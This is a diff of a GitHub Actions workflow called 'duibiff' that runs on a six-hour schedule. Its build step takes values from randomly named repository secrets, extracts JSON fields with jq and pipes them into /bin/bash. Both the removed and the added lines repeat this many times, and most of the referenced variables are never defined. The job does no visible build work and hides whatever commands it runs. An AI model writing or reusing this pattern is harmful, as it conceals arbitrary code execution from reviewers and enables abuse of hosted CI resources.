@@ -1,46 +1,22 @@
 name: duibiff
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
+    - cron: '2 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duibiff
         env:
-          fef2048: ${{ secrets.fef2048 }}
+          ppjos412: ${{ secrets.ppjos412 }}
         run: |
-          echo $fef2048 | jq -r .k3020 | /bin/bash
-          echo $kswgt710 | jq -r .qacrh977 | /bin/bash
-          echo $lv47367 | jq -r .bzyqu0 | /bin/bash
-          echo $oju60 | jq -r .pqiz8593 | /bin/bash
-          echo $n4502 | jq -r .ls42 | /bin/bash
-          echo $kwszf35 | jq -r .zpy0860 | /bin/bash
-          echo $a4 | jq -r .h19507 | /bin/bash
-          echo $xl48622 | jq -r .mho07 | /bin/bash
-          echo $dc20 | jq -r .fyh46 | /bin/bash
-          echo $zxnlw3 | jq -r .p719 | /bin/bash
-          echo $uk64807 | jq -r .k181 | /bin/bash
-          echo $wuwbj3 | jq -r .eott8 | /bin/bash
-          echo $u8 | jq -r .dkit8 | /bin/bash
-          echo $kv8 | jq -r .dzc31 | /bin/bash
-          echo $hikzb9 | jq -r .fmsmc04 | /bin/bash
-          echo $weog8428 | jq -r .o8142 | /bin/bash
-          echo $rou059 | jq -r .kswxk68432 | /bin/bash
-          echo $wpqsb333 | jq -r .jttqw10801 | /bin/bash
-          echo $a64 | jq -r .pqim08 | /bin/bash
-          echo $qxxpj8234 | jq -r .tz7814 | /bin/bash
-          echo $kmdq43 | jq -r .r789 | /bin/bash
-          echo $zgxcn8723 | jq -r .oy45397 | /bin/bash
-          echo $bg316 | jq -r .hxxx497 | /bin/bash
-          echo $lv953 | jq -r .ikmz73 | /bin/bash
-          echo $vjbzz33417 | jq -r .sf2222 | /bin/bash
-          echo $ot0447 | jq -r .khjwu173 | /bin/bash
-          echo $bbrqx2176 | jq -r .zod9 | /bin/bash
-          echo $qawl6 | jq -r .uj904 | /bin/bash
+          echo $ppjos412 | jq -r .wno69779 | /bin/bash
+          echo $o98641 | jq -r .dy014 | /bin/bash
+          echo $xdim36687 | jq -r .ioh2 | /bin/bash
+          echo $seqmq4476 | jq -r .hebr1 | /bin/bash
+          echo $gizln0 | jq -r .y1586 | /bin/bash
+          echo $udlvl414 | jq -r .ovdnh7115 | /bin/bash
 
